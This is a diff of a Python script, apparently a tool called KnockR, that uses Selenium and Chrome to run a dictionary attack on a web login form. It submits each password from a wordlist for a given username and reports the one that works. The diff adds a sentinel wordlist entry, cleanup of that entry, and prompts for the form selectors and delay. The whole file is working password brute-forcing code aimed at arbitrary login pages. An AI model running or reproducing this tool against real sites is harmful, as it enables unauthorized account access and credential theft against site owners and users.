@@ -1,14 +1,12 @@
 #!/usr/bin/env python3
 
 import sys
-from requests.api import get
 import selenium
 import requests
 import time
+import os
 from selenium import webdriver
 import argparse
-from selenium.webdriver.common.keys import Keys
-from selenium.common.exceptions import NoSuchElementException
 from selenium.webdriver.chrome.service import Service
 from selenium.webdriver.common.by import By
 
@@ -62,7 +60,8 @@ def get_request():
         pass
 
 def brutes(username, usr_sel ,pass_sel,button_sel,word_list, url, delay):
-    sys.stdout.write(color.DARKCYAN+'\n[~] '+ 'Checking if URL is reachable... '+color.END)
+    final_pass = None
+    sys.stdout.write(color.BLUE+'\n[~] '+ 'Checking if URL is reachable... '+color.END)
     sys.stdout.flush()
     try:
         get_request()
@@ -75,18 +74,20 @@ def brutes(username, usr_sel ,pass_sel,button_sel,word_list, url, delay):
             if get_request().status_code == 200:
                 print (color.GREEN+'[OK]'+color.END)
                 sys.stdout.flush()
-    except selenium.common.exceptions.NoSuchElementException:
-        pass
     except KeyboardInterrupt:
-        print (color.END+'\n[!] '+ 'User interrupt'+color.END)
-        sys.exit(0)
-        
+        sys.exit(color.RED+'\n[!] '+ 'Keyboard interrupt'+color.END)
+    else:
+        pass
+    
+    with open(word_list, 'a') as w:
+        w.write('mandatorylastcheck')
+                
     f = open(word_list, 'r')
     optionss = webdriver.ChromeOptions()
     optionss.add_argument("--disable-popup-blocking")
     optionss.add_argument("--disable-extensions")
     driver = webdriver.Chrome(service = Service(chromedriver))
-    print (color.GREEN+'[*] Starting dictionary attack against '+username+' with a '+delay+' seconds'+' delay\n'+color.END)
+    print (color.GREEN+'[*] Starting dictionary attack against '+color.YELLOW+username+color.GREEN+' with a '+color.YELLOW+delay+color.GREEN+' seconds delay\n'+color.END)
     for passwd in f:
         try:
             driver.get(url)
@@ -94,7 +95,10 @@ def brutes(username, usr_sel ,pass_sel,button_sel,word_list, url, delay):
             Sel_pas = driver.find_element(By.CSS_SELECTOR, pass_sel)
             driver.find_element(By.CSS_SELECTOR, button_sel)
             Sel_user.send_keys(username)
-            print('[~] Attempting password '+color.YELLOW+passwd+color.END, end='\r')
+            if passwd != 'mandatorylastcheck':
+                print(color.BLUE+"[~] Attempting password "+color.YELLOW+passwd+color.END, end='')
+            else:
+                pass
             Sel_pas.send_keys(passwd)
             time.sleep(int(delay))
             final_pass = passwd
@@ -120,11 +124,37 @@ def brutes(username, usr_sel ,pass_sel,button_sel,word_list, url, delay):
             # print(status_code) 
 
         except KeyboardInterrupt:
-            print (color.END+'\n[!]'+ 'User interrupt'+color.END)
-            sys.exit(0)
+            with open(word_list, "r") as f:
+                    lines = f.readlines()
+            with open(word_list, "w") as f:
+                for line in lines:
+                    if line.strip("\n") != 'mandatorylastcheck':
+                        f.write(line)
+            sys.exit(color.RED+'\n[!] User interrupt'+color.END)
         except selenium.common.exceptions.NoSuchElementException:
-            print(color.GREEN+'\n[+] Password found: ['+final_pass+']'+color.END)
-            sys.exit(0)
+            if final_pass == None:
+                with open(word_list, "r") as f:
+                    lines = f.readlines()
+                with open(word_list, "w") as f:
+                    for line in lines:
+                        if line.strip("\n") != 'mandatorylastcheck':
+                            f.write(line)
+                sys.exit(color.RED+'\n[+] An error occured'+color.END)
+            else:
+                with open(word_list, "r") as f:
+                    lines = f.readlines()
+                with open(word_list, "w") as f:
+                    for line in lines:
+                        if line.strip("\n") != 'mandatorylastcheck':
+                            f.write(line)
+                sys.exit(color.GREEN+'\nPassword found: '+color.PURPLE+final_pass+color.END)
+    with open(word_list, "r") as f:
+        lines = f.readlines()
+    with open(word_list, "w") as f:
+        for line in lines:
+            if line.strip("\n") != 'mandatorylastcheck':
+                f.write(line)
+    sys.exit(color.RED+'\n[-] Password not found'+color.END)
 
 def banner():
     banner = color.BOLD+'''
@@ -133,7 +163,7 @@ def banner():
 {2}| ' / | '_ \  / _ \  / __|| |/ /| |_) |
 {2}| . \ | | | || (_) || (__ |   < |  _ < 
 {2}|_|\_\|_| |_| \___/  \___||_|\_\|_| \_\\
-              {3}by kod34
+              {5}by kod34
                         
 '''.format(color.PURPLE, color.END, color.GREEN, color.RED, color.BLUE, color.DARKCYAN, color.CYAN)
     print(banner+color.END)
@@ -146,15 +176,24 @@ pass_sel = args.password_selector
 button_sel = args.login_selector
 url = args.url
 word_list = args.wordlist
+
+if not os.access(word_list, os.R_OK):
+        sys.exit(color.RED+'\n[-] Please give your wordlist reading permissions'+color.END)
+if not os.access(word_list, os.W_OK):
+        sys.exit(color.RED+'\n[-] Please give your wordlist writing permissions'+color.END)
+        
 chromedriver = args.chromedriver
 delay = args.delay
 
-if usr_sel == None:
-    usr_sel = input('Username selector: '+color.END)
-if pass_sel == None:    
-    pass_sel = input('Password selector: '+color.END)
-if button_sel == None:
-    button_sel = input('Login button selector: '+color.END)
-if delay == None:
-    delay = input('Delay: '+color.END)
+try:
+    while usr_sel == None or usr_sel == '':
+        usr_sel = input(color.YELLOW+'Username selector: '+color.END)
+    while pass_sel == None or pass_sel == '':    
+        pass_sel = input(color.YELLOW+'Password selector: '+color.END)
+    while button_sel == None or button_sel == '':
+        button_sel = input(color.YELLOW+'Login button selector: '+color.END)
+    while delay == None or not delay.isdigit():
+        delay = input(color.YELLOW+'Delay: '+color.END)
+except KeyboardInterrupt:
+    sys.exit(color.RED+'\n[!] User interrupt'+color.END)
 brutes(username, usr_sel ,pass_sel,button_sel,word_list, url, delay)
